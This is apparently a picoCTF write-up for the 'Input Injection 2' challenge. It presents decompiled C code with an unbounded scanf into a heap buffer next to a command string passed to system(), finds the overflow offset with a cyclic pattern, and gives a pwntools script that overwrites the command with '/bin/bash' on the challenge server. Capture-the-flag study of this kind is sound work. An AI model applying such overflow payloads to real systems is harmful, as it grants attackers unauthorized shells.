# Input Injection 2

so we have a file called vuln the code is simple<br>
### From ghidra:
```c
undefined8 main(void)

{
  void *pvVar1;
  char *__command;
  
  pvVar1 = malloc(0x1c);
  __command = malloc(0x1c);
  printf("username at %p\n",pvVar1);
  fflush(stdout);
  printf("shell at %p\n",__command);
  fflush(stdout);
  builtin_strncpy(__command,"/bin/pwd",9);
  printf("Enter username: ");
  fflush(stdout);
  __isoc99_scanf(&DAT_00402032,pvVar1);
  printf("Hello, %s. Your shell is %s.\n",pvVar1,__command);
  system(__command);
  fflush(stdout);
  return 0;
}
```
what we see here is a flow from username at <b>XXX</b> and right after is an execution of the command `/bin/pwd`.<br>
What does that say? <br> if there is a flow from `pvVar1` to `_command` which is `/bin/pwd` then we have our /bin/bash injected to it 

so i used pwndbg to find out where the overflow is located.<br>
<img width="1920" height="1046" alt="img1" src="https://github.com/user-attachments/assets/46c0ff0a-8823-4083-8887-e6ed68348bb9" />
a<7 letters>b<7 letters>c<7 letters>d<7 letters> ...
<br>
look at this result:
 Your shell is gaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaa`Hello, aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaap.

so it cuts of the possition of `gaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaa` and sets it as _command

then what about `aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaa/bin/bash`

```python
from pwn import *
HOST = "amiable-citadel.picoctf.net" 
PORT = 56613

p = remote(HOST,PORT)
p.readuntil("Enter username: ")
exploit = b"aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaa/bin/bash"
p.sendline(exploit)
p.interactive()
```
<img width="1272" height="756" alt="image2" src="https://github.com/user-attachments/assets/cb748f67-c061-4f23-8bf4-5e3c66ff2637" />
